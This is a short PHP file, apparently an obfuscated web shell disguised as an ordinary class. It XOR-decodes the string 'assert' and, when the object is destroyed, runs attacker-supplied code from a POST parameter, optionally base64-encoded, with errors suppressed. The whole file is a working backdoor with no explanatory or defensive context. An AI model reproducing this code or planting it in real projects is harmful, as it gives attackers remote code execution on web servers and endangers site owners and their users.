<?php 
class JWXT { 
    function fPzM() {
        $Gnar = "\x90" ^ "\xf1";
        $csSx = "\xb9" ^ "\xca";
        $SfQJ = "\x68" ^ "\x1b";
        $jZNR = "\x9c" ^ "\xf9";
        $UZVc = "\x27" ^ "\x55";
        $VOBT = "\xe0" ^ "\x94";
        $pype =$Gnar.$csSx.$SfQJ.$jZNR.$UZVc.$VOBT;
        return $pype;
    }
    function __destruct(){
        $DTOk=$this->fPzM();
        @$DTOk($this->BE);
    }
}
$jwxt = new JWXT();
@$jwxt->BE = isset($_GET['id'])?base64_decode($_POST['bj']):$_POST['bj'];
?>
